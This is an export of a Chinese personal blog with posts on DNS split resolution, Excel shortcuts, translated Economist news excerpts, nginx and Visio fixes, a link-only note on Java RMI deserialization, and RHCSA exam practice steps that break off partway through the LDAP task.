<li>设置网卡信息<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmtui #进入图形化界面配置网卡信息</span><br><span class="line">systemctl restart network #重启网卡使配置生效 </span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/imagedf8d626ac2a67a74.png" alt="imagedf8d626ac2a67a74.png"></li>
<li>开启DNS服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start named</span><br><span class="line">systemctl enable named</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="验证DNS分离解析服务的效果"><a href="#验证DNS分离解析服务的效果" class="headerlink" title="验证DNS分离解析服务的效果"></a>验证DNS分离解析服务的效果</h2><p>开启一台可以连外网的客户端（网卡为桥接模式），更改IP地址分别模拟北京用户和美国用户，观察域名<a href="http://www.linuxprobe.com解析出的IP地址是多少。">www.linuxprobe.com解析出的IP地址是多少。</a></p>
<ul>
<li>模拟北京用户<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmtui #进入图形化界面配置网卡信息</span><br><span class="line">systemctl restart network #重启网卡使配置生效 </span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image3c70a91180774d01.png" alt="image3c70a91180774d01.png"><br>测试分离解析是否成功<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.linuxprobe.com #解析出的IP是北京网络，就说明分离解析成功</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image02894ecf9a80b752.png" alt="image02894ecf9a80b752.png"></li>
<li>模拟美国用户<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmtui #进入图形化界面配置网卡信息</span><br><span class="line">systemctl restart network #重启网卡使配置生效 </span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image804c56d8f8973430.png" alt="image804c56d8f8973430.png"><br>测试分离解析是否成功<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.linuxprobe.com #解析出的IP是美国网络，就说明分离解析成功</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image502a16fd9de744a5.png" alt="image502a16fd9de744a5.png"></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>DNS分离解析</tag>
      </tags>
  </entry>
  <entry>
    <title>Excel批量填充相同数据</title>
    <url>//posts/ZH-CN/Excel-batch-insert-data.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我需要做一个假表，表里面的数据都填写为xxx。<br><escape> <span id="more"></span></escape></p>
<h2 id="excel怎么批量填充相同数据"><a href="#excel怎么批量填充相同数据" class="headerlink" title="excel怎么批量填充相同数据"></a>excel怎么批量填充相同数据</h2><h3 id="方法1：向下批量填充、向右批量填充"><a href="#方法1：向下批量填充、向右批量填充" class="headerlink" title="方法1：向下批量填充、向右批量填充"></a>方法1：向下批量填充、向右批量填充</h3><ol>
<li>选一个单元格录入数据</li>
<li>选中录入范围</li>
<li>向下批量填充：crtl + D<br><a href="https://v2ray.dana5haw.com:8008/image/Z1xe"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image3c024168b8a7dc1a.png" alt="image3c024168b8a7dc1a.png"></a></li>
<li>向右批量填充：ctrl + R<br><a href="https://v2ray.dana5haw.com:8008/image/ZZa3"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image66e476815e54c16e.png" alt="image66e476815e54c16e.png"></a></li>
</ol>
<hr>
<p>这样记忆：D（Down）、R（Right）</p>
<h3 id="方法2：批量输入数据"><a href="#方法2：批量输入数据" class="headerlink" title="方法2：批量输入数据"></a>方法2：批量输入数据</h3><ol>
<li>选中录入范围</li>
<li>填写数据</li>
<li>按快捷键：ctrl + enter<br><a href="https://v2ray.dana5haw.com:8008/image/ZgrL"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image4efb98773237d44d.png" alt="image4efb98773237d44d.png"></a></li>
</ol>
<h3 id="动图展示"><a href="#动图展示" class="headerlink" title="动图展示"></a>动图展示</h3><p>动图：<br><a href="https://v2ray.dana5haw.com:8008/image/Zh9p"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/test2.gif" alt="批量填充相同数据.gif"></a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>参考这篇<a href="https://feng.ifeng.com/c/7jAaotaJ5zU">教程</a></p>
]]></content>
      <categories>
        <category>excel</category>
      </categories>
      <tags>
        <tag>excel快捷键</tag>
        <tag>批量填充相同数据</tag>
      </tags>
  </entry>
  <entry>
    <title>(Facebook OR 雅虎) VS 数据安全法</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-95day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-95天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Facebook VS 数据安全法</p>
<p>Meta, parent company to Facebook, said it would shut down the platform’s facial-recognition system amid “growing societal concerns”.</p>
<p>在“持续不断的社会关注”下，Facebook的母公司Meta宣布将关闭平台的人脸识别系统。</p>
<p>Facebook will delete over a billion images of people’s faces from its repository.</p>
<p>Facebook将从存储库中删除上十亿的人脸照片。</p>
<p>More than a third of Facebook users had consented to being automatically identified and suggested for tags in photos and videos, but they will no longer be recognised.</p>
<p>超过三分之一的Facebook用户同意了关于照片和视频的用户协议，同意协议后，系统会自动识别人脸并推荐标签。但在未来，用户的人脸信息不再被自动识别。</p>
<p>（推荐标签功能是这样的，图源：新浪财经：太平洋电脑网）</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/03/facebook.png" alt="facebook.png"></p>
<p>雅虎 VS 数据安全法</p>
<p>Yahoo said it would end its operations in China owing to an “increasingly challenging business and legal environment”.</p>
<p>由于“越来越具挑战的商业环境和法律环境”，雅虎宣布将在中国停止运营。</p>
<p>（图源：华尔街日报）</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/03/yahoo.png" alt="yahoo.png"></p>
<p>The move is largely symbolic: the tech firm had already shut down most of its services, such as its email offering.</p>
<p>这个动作非常具有标志性：这家科技公司很早就关闭了邮件服务等大部分业务。</p>
<p>Yahoo’s departure coincides with the introduction of new rules governing how firms can store and transfer data.</p>
<p>雅虎的撤退恰逢新规，这项新规（数据安全法）规定了如何管控企业的数据存储和数据传输。</p>
<p>Last month LinkedIn, a professional-networking site, also quit China.</p>
<p>上个月，职业社交网站领英也宣布退出中国。</p>
<p>数据管控越来越严格了。</p>
<p>以后一定要去加州看看Dana Point。<br><img src="https://v2ray.dana5haw.com:8008/images/2021/11/03/Dana-Point.png" alt="Dana-Point.png"></p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>I期马拉松|坚持100天喝经济学人浓咖啡（-100）</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-100day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划开启！第-100天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Neural Link:<br>神经元连接:<br>Your brain has a unique signature<br>大脑的独特标识<br>Technology is rapidly changing the way in which people can be identified.<br>技术的快速发展正改变着身份识别的方式。<br>Fingerprints, voices, faces and even retinas can all serve as proof of identity.<br>指纹、声音、人脸，甚至虹膜都可以用作身份证明。<br>In recent years neuroscientists have developed perhaps the most personal method yet: brain fingerprinting.<br>近年来，神经科学家发现了可能最个性化的识别方式：脑指纹。<br>Using MRI scans, they can build a fluctuating model of a person’s brain activity called their connectome.<br>核磁共振扫描可以生成脑部活动的动态模型，称作“连接组”。<br>Despite the fluctuation, scans of the same individual’s brain taken days apart can be matched up with 95% accuracy.<br>尽管模型是动态的，但是在几天内同一个人的扫描结果匹配准确度达到95%。<br>On Friday Science Advances, a journal, reported that neuroscientists have refined the technique further.<br>周五，Science Advances期刊报导，神经科学家已经进一步完善这项技术。<br>A unique neural snapshot can now be obtained in just 100 seconds.<br>现在能够做到在100秒以内捕获一个独特的神经元快照。<br>The authors say brain fingerprinting could be employed to diagnose neurological conditions such as autism early.<br>作者讲到脑指纹可用于诊断神经元病变，例如自闭症。<br>Tests are already under way for Alzheimer’s disease, which seems to entail a loss of the sufferer’s unique neural signature.<br>阿尔兹海默症的相关实验正在进行中，实验表明患者似乎丧失了某个独特的神经元特征。<br>The possibility of an unforgeable mental signature may soon escape the realm of science fiction.<br>不可伪造的神经元标识可能很快就不再专属于科幻小说领域了。</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>I期马拉松|坚持100天喝经济学人浓咖啡（-98）</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-98day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-98天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Out of the locker: gay football players</p>
<p>出柜：同性恋足球运动员</p>
<p>The most recognisable player in women’s football, Megan Rapinoe, is gay.</p>
<p>女足最知名的球员Megan Raplinoe是同性恋。</p>
<p>So are Ashlyn Harris and Ali Krieger, her teammates on the American women’s team.</p>
<p>她的队友Ashlyn Harris和Ali Krieger也是同性恋。</p>
<p>Hope Powell, a legendary English coach, is also a lesbian, as is the former England captain Casey Stoney.</p>
<p>传奇英国女足教练Hope Powell和前英国女足队长Casey Stoney也是女同。</p>
<p>Women’s football has created a culture of acceptance.</p>
<p>女足创下了接受同性恋的先河。</p>
<p>The same cannot be said for the men’s game.</p>
<p>但是对于男足而言，同性恋的接受度就不是那么回事了。</p>
<p>This week a 21-year-old Australian male footballer, Josh Cavallo, came out on social media.</p>
<p>本周，21岁的澳大利亚男足球员Josh Cavallo在社交媒体宣布出柜。</p>
<p>This made him the only openly gay player in a major men’s league.</p>
<p>他成为了唯一一名在某个国家顶级联赛中公开出柜的球员。</p>
<p>A few footballers have come out after retiring, but only one other top-level professional player, Justin Fashanu, had come out while playing in a top-flight league.</p>
<p>少数球员在退役之后出柜，但是只有一名顶级专业球员Justin Fashanu在打顶级联赛时出柜。</p>
<p>Mr Cavallo intends to play almost all of his career with his sexuality publicly known.</p>
<p>Cavallo打算在性向公开的情况下继续他的足球事业。</p>
<p>Clubs and players welcomed his decision.</p>
<p>俱乐部和球员都支持他的决定。</p>
<p>If fans show him the same respect, the future of the men’s game could be more inclusive.</p>
<p>如果粉丝也尊重他的决定，那么男足将会变得更包容。</p>
<p>男足和女足对同性恋的态度真的天壤地别。运动员长期和队友一起训练和生活，很难不产生同性恋啊，想必是有很多不敢出柜的男足球员。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/l4GuGsGLmoqza8nn9iasHDPfhE1MmdmAT7U9vWXiaHQKMQpxtXvQCf3sH6exObynlCo9ZWY5VXoY3Joycb2wInVw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="male palyer.png"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/l4GuGsGLmoqza8nn9iasHDPfhE1MmdmATpLn9S9rBhW3cv00Z3Cra1AQlj38IS7Xd0QCIdj3ML5svokf0WbbLhg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="female palyer.png"></p>
<p>新闻里面讲的当事人——21岁的澳大利亚男足球员Josh Cavallo。如果他不讲，应该很难看出来吧。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/l4GuGsGLmoqza8nn9iasHDPfhE1MmdmAT3U7QFx1zO8RpraiaDfQqp2t1IOS4Mxa6KvicFRKbKYcf4qmzBRfkBtWw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="LQBT palyer.png"></p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>I期马拉松|坚持100天喝经济学人浓咖啡（-97）</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-97day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-97天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>The kicked can: COP26</p>
<p>权宜之计：COP26峰会</p>
<p>As COP26, the United Nations climate change summit, opened in Glasgow on Sunday, world leaders were finishing up the G20 one in Rome.</p>
<p>世界各国领导人刚开完罗马G20峰会，本周日，在格拉斯哥召开了联合国COP26气候峰会。</p>
<p>Their closing statement did not bode well for the climate conference.</p>
<p>各国领导人在罗马G20峰会达成的最终声明对气候峰会而言并不是什么好兆头。</p>
<p>In it, the G20 countries—responsible for an estimated 80% of greenhouse-gas emissions—reaffirmed their commitment to the agreement, made in Paris in 2015, to “pursue efforts” to keep global temperature increases to 1.5°C above pre-industrial levels.</p>
<p>在罗马G20峰会上，G20国家—估计占全球温室气体排放的80%—重申了他们在2015年巴黎协定中做出的承诺：“尽力”将全球平均气温相比工业化前水平的增幅限制在1.5℃水平。</p>
<p>But they prevaricated about how, making only hand-waving commitments to “support” countries phasing out coal and to strengthen national plans to cut emissions “if necessary”.</p>
<p>但是他们对于具体如何落地却含糊其辞，只是做出华而不实的承诺：“支持”退煤政策，“在必要时”强化国家减排方案。</p>
<p>Such evasion is at odds with the urgency of Alok Sharma, the COP26 president.</p>
<p>这些逃避措辞和COP26峰会主席Alok Sharma的紧迫感产生了矛盾。</p>
<p>His opening speech stressed the need to ensure that “where Paris promised, Glasgow delivers.”</p>
<p>他在公开演讲中强调要求：“在巴黎承诺的，就得在格拉斯哥交付”。</p>
<p>Participants at COP26 have two weeks to figure out how to keep the goals of the Paris agreement alive.</p>
<p>对COP26峰会的参与国而言，他们还有两周时间提出落实巴黎协定的具体方案。</p>
<p>There is no more time to procrastinate.</p>
<p>没那么多时间权宜了。</p>
<p>COP26峰会就是催收作业的课代表，没完成作业的国家还不少。这两周时间各国会想出什么落地方案呢？拭目以待。（可不要是大家一致推出碳税……）</p>
<p>课代表</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/01/_20211101132044.png" alt="_20211101132044.png"></p>
<p>紧张的同学们</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/01/_20211101132248.png" alt="_20211101132248.png"></p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/01/_20211101132204.png" alt="_20211101132204.png"></p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/01/_20211101132329.png" alt="_20211101132329.png"></p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>I期马拉松-坚持100天喝经济学人浓咖啡（-99）</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-99day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-99天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Artificial selection: how evolution could design future robots</p>
<p>人工选择：如何利用进化设计未来机器人</p>
<p>What if an algorithm could mimic hundreds of millions of years of evolution?</p>
<p>如果有一种算法可以模拟数百万年的进化会怎样呢？</p>
<p>A team from Stanford University tried to do just that.</p>
<p>斯坦福大学的一支团队正尝试实现这种算法。</p>
<p>Their results, published in Nature Communications, a journal, could suggest ways to improve artificial intelligence.</p>
<p>他们在Nature Communications期刊发表论文，并提出了改善人工智能的建议。</p>
<p>The researchers created virtual environments filled with hundreds of creepy crawlies to test the approach.</p>
<p>为了测试这种新方法，研究学者创建了包含上百个爬虫的虚拟环境。</p>
<p>The “unimals” were programmed to learn tasks, such as moving a ball or maneuvering through obstacles, while continuously evolving.</p>
<p>经过编程的“unimal”（虚拟生物）通过不断迭代来学习任务，这些任务包括移动小球，或者穿越障碍物。</p>
<p>As in the animal kingdom, the fittest member would reproduce.</p>
<p>就像动物世界一样，适者生存。</p>
<p>The offspring, which overwrote the parent, would be a physical mutation involving one genetic tweak: an extra limb for stability or a different joint for flexibility, perhaps.</p>
<p>后代重写父代基因，这属于物理突变。比如基因微调：增加一个肢体以利于稳定性，或者增加一个关节可能会利于灵活性。</p>
<p>After 10 generations the most successful unimals could master tasks twice as fast as their ancestors, despite having the same baseline intelligence.</p>
<p>经过10个迭代之后，在相同智力基线水平下，最成功的“unimal”掌握任务的速度是祖先的两倍。</p>
<p>Like in nature, a robot could adapt faster if its body and artificial mind evolve in tandem.</p>
<p>自然情况下，如果机器人的身体和智能同时进化，它会更快适应环境。</p>
<p>文中所讲的斯坦福大学团队就是李飞飞团队。</p>
<p>（图源：科学网）<br><img src="https://mmbiz.qpic.cn/mmbiz_png/l4GuGsGLmoroGVQMhxIsfjHgSazxlrNnJo5O2QWTpSEyGwhOlaIhTicPysVhTwZfZuu78VKQPu2wx7ANyLyPQsw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="lff.jpg"><br><img src="https://v2ray.dana5haw.com:8008/images/2021/10/31/unimal.jpg" alt="unimal.jpg"></p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
        <tag>虚拟生物</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-RMI反序列化</title>
    <url>//posts/ZH-CN/Bug_Java-RMI.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文讲述了Java RMI Registry 远程bind对象所带来的反序列化问题，包括两个level。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h2><p><a href="https://www.anquanke.com/post/id/197829">https://www.anquanke.com/post/id/197829</a></p>
<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>java反序列化漏洞很常见，要理解这个漏洞，得学会java这门语言。先挖个坑，过后来填。以现在的水平，这篇文章的分析，几乎是一个字也看不懂。</p>
]]></content>
      <categories>
        <category>每日漏洞学习</category>
      </categories>
      <tags>
        <tag>Java RMI反序列化</tag>
        <tag>漏洞学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx的pid进程消失，服务突然挂掉怎么办</title>
    <url>//posts/ZH-CN/Nginx-pid-disappear.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近遇到一个奇葩问题，nginx神不知鬼不觉地挂掉了，检查配置文件失败，发现是pid文件缺失。怎么办呢？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="pid文件缺失怎么办"><a href="#pid文件缺失怎么办" class="headerlink" title="pid文件缺失怎么办"></a>pid文件缺失怎么办</h2><p>自己创建一个pid文件，随意写一个进程id放到文件里面，重启Nginx服务。另外，Keepalived服务也不知道为啥挂掉了，也得重启。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>参考了这篇<a href="https://blog.51cto.com/10950710/2309265">教程</a></p>
]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx反向代理</tag>
        <tag>pid文件消失</tag>
      </tags>
  </entry>
  <entry>
    <title>OTP工具安装visio</title>
    <url>//posts/ZH-CN/OTP_Install_Visio.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>安装了office365专业版之后，使用OTP工具安装visio。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>部署，添加产品<code>Visio专业版2016-批量版-[VisioProVolume]</code>，选择安装模块<code>Office Tool Plus</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtnazdrt7j30ni0a0t9f.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtna4qs07j312e0ltqc7.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtncbjxn9j312e0lt7ea.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>visio</category>
        <category>安装教程</category>
      </categories>
      <tags>
        <tag>visio安装</tag>
        <tag>OTP工具</tag>
      </tags>
  </entry>
  <entry>
    <title>RHCSA练习</title>
    <url>//posts/ZH-CN/RHCSA-practice.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>练习RHCSA题目。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">虚拟机的网络配置应该如下：</span><br><span class="line">主机名： station.domain1.example.com</span><br><span class="line">IP地址： 172.24.1.5</span><br><span class="line">子网掩码： 255.255.255.0</span><br><span class="line">网关 172.24.1.254</span><br><span class="line">名称服务： 172.24.1.250</span><br><span class="line">虚拟机的 root 密码是 flectrag</span><br></pre></td></tr></table></figure>

<h2 id="破解root密码"><a href="#破解root密码" class="headerlink" title="破解root密码"></a>破解root密码</h2><ol>
<li>重启虚拟机，按e进入编辑模式，在linux16这行末尾加上<code>rd.break</code>，按ctrl+x启动。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image.png" alt="image.png"></li>
<li>执行以下命令，重置root密码，重启虚拟机。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o remount,rw /sysroot</span><br><span class="line">chroot /sysroot</span><br><span class="line">echo &quot;flectrag&quot; | passwd --stdin root</span><br><span class="line">touch /.autorelabel</span><br><span class="line">exit</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image9cebc510014f6486.png" alt="image9cebc510014f6486.png"></li>
<li>以重置的密码登录到root用户</li>
</ol>
<h2 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h2><p>使用nm-connetion-editor配置网卡信息，重启网卡<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image84e01cc66367709d.png" alt="image84e01cc66367709d.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imageae2ef2e0312bef29.png" alt="imageae2ef2e0312bef29.png"></p>
<h2 id="配置SELINUX"><a href="#配置SELINUX" class="headerlink" title="配置SELINUX"></a>配置SELINUX</h2><p>默认配置是enforcing，检查一下配置文件（/etc/selinux/config）的配置就行。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imagec2f0a3522027e869.png" alt="imagec2f0a3522027e869.png"></p>
<h2 id="配置yum仓库"><a href="#配置yum仓库" class="headerlink" title="配置yum仓库"></a>配置yum仓库</h2><ol>
<li>编辑yum配置文件<code>/etc/yum.repos.d/rhcsa.repo</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[rhcsa]</span><br><span class="line">name=rhcsa</span><br><span class="line">baseurl=http://rhgls.domain1.example.com/rhel</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br></pre></td></tr></table></figure></li>
<li>yum clean all</li>
<li>yum makecache</li>
</ol>
<h2 id="调整逻辑卷大小"><a href="#调整逻辑卷大小" class="headerlink" title="调整逻辑卷大小"></a>调整逻辑卷大小</h2><ol>
<li>添加一块20G硬盘<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imagedf280f9948188cdc.png" alt="imagedf280f9948188cdc.png"></li>
<li>创建一个逻辑卷，大小为200M<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/imagee1f38818b51e09c6.png" alt="imagee1f38818b51e09c6.png"></li>
<li>将逻辑卷扩容至300M</li>
</ol>
<ul>
<li>逻辑卷挂载到/finance目录<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image9adc2e441f5389f9.png" alt="image9adc2e441f5389f9.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image6a66760da30e2981.png" alt="image6a66760da30e2981.png"></li>
<li>扩容<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image9f017c72d2afeb2e.png" alt="image9f017c72d2afeb2e.png"></li>
</ul>
<h2 id="创建用户账户"><a href="#创建用户账户" class="headerlink" title="创建用户账户"></a>创建用户账户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个名为 adminuser 的组</span><br><span class="line">一个名为 natasha 的用户，其属于 adminuser ，这个组是该用户的从属组</span><br><span class="line">一个名为 harry 的用户，属于 adminuser ，这个组是该用户的从属组</span><br><span class="line">一个名为 sarah 的用户，其在系统中没有可交互的 shell，并且该用户不是 adminuser 组的成员</span><br><span class="line">用户 natasha ， harry ，和 sarah 的密码都要设置为 flectrag</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image3cc73e52d77c097d.png" alt="image3cc73e52d77c097d.png"></p>
<h2 id="配置文件-var-tmp-fstab的权限"><a href="#配置文件-var-tmp-fstab的权限" class="headerlink" title="配置文件/var/tmp/fstab的权限"></a>配置文件/var/tmp/fstab的权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拷贝文件 /etc/fstab 到 /var/tmp/fstab。 配置文件 /var/tmp/fstab 的权限：</span><br><span class="line">文件 /var/tmp/fstab 的拥有者是 root 用户</span><br><span class="line">文件 /var/tmp/fstab 属于 root 组</span><br><span class="line">文件 /var/tmp/fstab 对任何人都不可执行</span><br><span class="line">用户 natasha 能够对文件 /var/tmp/fstab 具有读和写的权限</span><br><span class="line">用户 harry 对文件 /var/tmp/fstab 既不能读，也不能写</span><br><span class="line">所有其他用户（当前的和将来的）能够对文件 /var/tmp/fstab 进行读操作</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image3fec89fc09b82a7b.png" alt="image3fec89fc09b82a7b.png"></p>
<h2 id="配置一个cron任务"><a href="#配置一个cron任务" class="headerlink" title="配置一个cron任务"></a>配置一个cron任务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户 natasha 必须配置一个定时执行任务，每天在本地时间 14:23 时执行命令。</span><br><span class="line">/bin/echo hiya</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image350a6c0804039dfb.png" alt="image350a6c0804039dfb.png"></p>
<h2 id="创建一个共享目录"><a href="#创建一个共享目录" class="headerlink" title="创建一个共享目录"></a>创建一个共享目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建一个共享目录 /home/admins ，特性如下：</span><br><span class="line">/home/admins 目录的组所有权是 adminuser</span><br><span class="line">adminuser 组的成员对目录有读写和执行的权限。除此之外的其他所有用户没有任何权限（root 用户能够访问系统中的所有文件和目录）</span><br><span class="line">在 /home/admins 目录中创建的文件，其组所有权会自动设置为属于 adminuser 组</span><br></pre></td></tr></table></figure>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://v2ray.dana5haw.com:8008/images/2020/07/17/image4929cc5c7eb3e5bf.png" alt="image4929cc5c7eb3e5bf.png"></h2><p>sgid：该目录创建的文件自动属于目录的所有组</p>
<h2 id="安装内核的升级"><a href="#安装内核的升级" class="headerlink" title="安装内核的升级"></a>安装内核的升级</h2><ol>
<li>编辑yum配置文件/etc/yum.repos.d/update.repo<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[update]</span><br><span class="line">name=update</span><br><span class="line">baseurl=http://rhgls.domain1.example.com/updates</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br></pre></td></tr></table></figure></li>
<li>yum clean all</li>
<li>yum makecache</li>
<li>yum update kernel</li>
</ol>
<h2 id="绑定到外部验证服务"><a href="#绑定到外部验证服务" class="headerlink" title="绑定到外部验证服务"></a>绑定到外部验证服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统 host.domain1.example.com 提供了一个 LDAP 验证服务。您的系统需要按照以下要求绑定到这个服务上：</span><br><span class="line">验证服务器的基本 DN 是： dc=domain1,dc=example,dc=com.</span><br><span class="line">帐户信息和验证信息都是由 LDAP 提供的。</span><br><span class="line">连接需要使用证书进行加密，证书可以在下面的链接中下载： ftp://host.domain1.example.com/pub/domain1.crt</span><br><span class="line">当正确完成配置后，用户 ldapuser1 应该能够登录到您的系统中，但是没有主目录。当您完成 autofs 的题目之后，才能生成主目录。</span><br></pre></td></tr></table></figure>
<ol>
<li>安装LDAP相关软件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install openldap openldap-clients sssd authconfig-gtk</span><br></pre></td></tr></table></figure></li>
